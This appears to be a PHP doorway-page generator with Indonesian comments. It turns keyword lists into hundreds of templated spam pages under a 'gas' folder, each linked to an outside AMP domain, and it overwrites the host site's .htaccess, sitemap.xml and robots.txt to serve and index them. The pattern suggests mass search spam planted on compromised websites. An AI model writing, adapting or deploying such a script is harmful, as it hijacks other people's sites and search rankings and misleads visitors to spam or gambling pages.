<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Fungsi untuk membaca file dari path
function getFileContent($filePath) {
    if (!file_exists($filePath)) {
        throw new Exception("File tidak ditemukan di: $filePath");
    }
    $content = file_get_contents($filePath);
    if ($content === false) {
        throw new Exception("Gagal membaca konten file: $filePath");
    }
    return $content;
}

// Fungsi untuk memastikan URL memiliki trailing slash
function ensureTrailingSlash($url) {
    return rtrim($url, '/') . '/';
}

// Fungsi untuk mendapatkan artikel secara acak
function getRandomArticle($articles) {
    if (empty($articles)) {
        return "No article content available.";
    }
    return $articles[array_rand($articles)];
}

// Konfigurasi dasar
$filename = $gas_txt;
$templateFile = $template_php;
$mainDir = "gas";
$successfulUrls = [];
$titlesFile = $title_txt;
$descriptionsFile = $descriptions_txt;
$articlesFile = $articles_txt;

// Membaca title, deskripsi dan artikel dari file terpisah
$titles = [];
$descriptions = [];
$articles = [];

try {
    // Baca file titles
    $titleContent = getFileContent($titlesFile);
    $titles = array_filter(array_map('trim', explode("\n", $titleContent)));
    
    if (empty($titles)) {
        throw new Exception("File title kosong atau tidak valid");
    }
    
    // Baca file descriptions
    $descriptionContent = getFileContent($descriptionsFile);
    $descriptions = array_filter(array_map('trim', explode("\n", $descriptionContent)));
    
    if (empty($descriptions)) {
        throw new Exception("File description kosong atau tidak valid");
    }

    // Baca file artikel
    $articleContent = getFileContent($articlesFile);
    $articles = array_filter(array_map('trim', explode("\n---\n", $articleContent)));
    
    if (empty($articles)) {
        throw new Exception("File artikel kosong atau tidak valid");
    }

    // Baca template
    $templateContent = getFileContent($templateFile);

    // Baca keywords
    $keywordsContent = getFileContent($filename);
    $lines = explode("\n", $keywordsContent);
    $lines = array_filter(array_map('trim', $lines));

    // Buat direktori utama
    if (!is_dir($mainDir)) {
        if (!mkdir($mainDir, 0755)) {
            throw new Exception("Gagal membuat direktori '$mainDir'");
        }
    }

    // Setup domain
    $currentDomain = $_SERVER['HTTP_HOST'];

    // Loop melalui keyword dan deskripsi
    $titleIndex = 0;
    $descriptionIndex = 0;

    foreach ($lines as $line) {
        $folderName = str_replace(' ', '-', trim($line));
        $folderPath = "$mainDir/$folderName";
        
        // URL setup dengan memastikan ada trailing slash
        $folderURL = ensureTrailingSlash("https://$currentDomain/$folderName");
        $ampURL = ensureTrailingSlash("https://ampmasal.xyz/$folderName");
        
        // Ambil title, deskripsi dan artikel
        $title = isset($titles[$titleIndex]) ? $titles[$titleIndex] : $titles[0];
        $description = isset($descriptions[$descriptionIndex]) ? $descriptions[$descriptionIndex] : $descriptions[0];
        $article = getRandomArticle($articles);

        // Update indeks
        $titleIndex = ($titleIndex + 1) % count($titles);
        $descriptionIndex = ($descriptionIndex + 1) % count($descriptions);

        // Buat folder
        if (!is_dir($folderPath) && !mkdir($folderPath, 0755, true)) {
            continue;
        }

        // Proses template
        $customContent = str_replace(
            [
                '{{BRAND_NAME}}',
                '{{URL_PATH}}',
                '{{AMP_URL}}',
                '{{BRANDS_NAME}}',
                '{{TITLE}}',
                '{{DESCRIPTION}}',
                '{{ARTICLE}}'
            ],
            [
                strtoupper($folderName),
                $folderURL,
                $ampURL,
                strtolower($folderName),
                $title,
                $description,
                $article
            ],
            $templateContent
        );

        // Tulis file index.php
        $indexPath = "$folderPath/index.php";
        if (file_put_contents($indexPath, $customContent) !== false) {
            echo "🔗 <a href='$folderURL' target='_blank'>$folderURL</a><br>";
            $successfulUrls[] = $folderURL;
        }
    }

    // Generate .htaccess
    $htaccess = "RewriteEngine On\n";
    $htaccess .= "RewriteBase /\n\n";
    $htaccess .= "# Enforce trailing slash\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} /+[^\.]+$\n";
    $htaccess .= "RewriteRule ^(.+[^/])$ %{REQUEST_URI}/ [R=301,L]\n\n";
    $htaccess .= "# Redirect from /gas/ URLs\n";
    $htaccess .= "RewriteCond %{THE_REQUEST} \s/+gas/([^\s]+) [NC]\n";
    $htaccess .= "RewriteRule ^ /%1 [R=301,L,NE]\n\n";
    $htaccess .= "# Internal rewrite\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} !^/gas/\n";
    $htaccess .= "RewriteRule ^([^/]+)/?$ gas/$1/ [L,PT]\n\n";
    $htaccess .= "# Prevent direct gas access\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} ^/gas/\n";
    $htaccess .= "RewriteCond %{ENV:REDIRECT_STATUS} ^$\n";
    $htaccess .= "RewriteRule ^ - [F]\n\n";
    $htaccess .= "# Disable directory indexing\n";
    $htaccess .= "Options -Indexes\n\n";
    $htaccess .= "# Prevent caching\n";
    $htaccess .= "<IfModule mod_headers.c>\n";
    $htaccess .= "    Header set Cache-Control \"no-cache, no-store, must-revalidate\"\n";
    $htaccess .= "    Header set Pragma \"no-cache\"\n";
    $htaccess .= "    Header set Expires 0\n";
    $htaccess .= "</IfModule>";

    // Tulis .htaccess
    if (file_put_contents('.htaccess', $htaccess) === false) {
        throw new Exception("Gagal membuat file .htaccess");
    }

    // Generate sitemap.xml
    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    $sitemap .= '<!--' . "\n";
    $sitemap .= "Created with IncludeHelp XML Sitemap Generator\n";
    $sitemap .= "https://www.includehelp.com/tools/xml-sitemap-generator.aspx\n";
    $sitemap .= ' -->' . "\n";

    foreach ($successfulUrls as $url) {
        $sitemap .= "<url>\n";
        $sitemap .= "\t<loc>" . $url . "</loc>\n";
        $sitemap .= "\t<lastmod>" . date('Y-m-d') . "</lastmod>\n";
        $sitemap .= "\t<changefreq>weekly</changefreq>\n";
        $sitemap .= "\t<priority>1.0</priority>\n";
        $sitemap .= "</url>\n";
    }

    $sitemap .= "</urlset>";

    if (file_put_contents('sitemap.xml', $sitemap) !== false) {
        echo "<br>✅ Sitemap.xml berhasil dibuat<br>";
    }

    // Generate robots.txt
    $robotsContent = "User-agent: *\n";
    $robotsContent .= "Sitemap: " . ensureTrailingSlash("https://" . $currentDomain) . "sitemap.xml";

    if (file_put_contents('robots.txt', $robotsContent) !== false) {
        echo "✅ Robots.txt berhasil dibuat<br>";
        chmod('robots.txt', 0644);
    }

    echo "<br>Proses selesai.";

    // Set permissions
    chmod('.htaccess', 0644);
    chmod($mainDir, 0755);
    chmod('sitemap.xml', 0644);

} catch (Exception $e) {
    echo "<h2>Error:</h2>";
    echo $e->getMessage();
    error_log("Create Folders Error: " . $e->getMessage());
}
?>
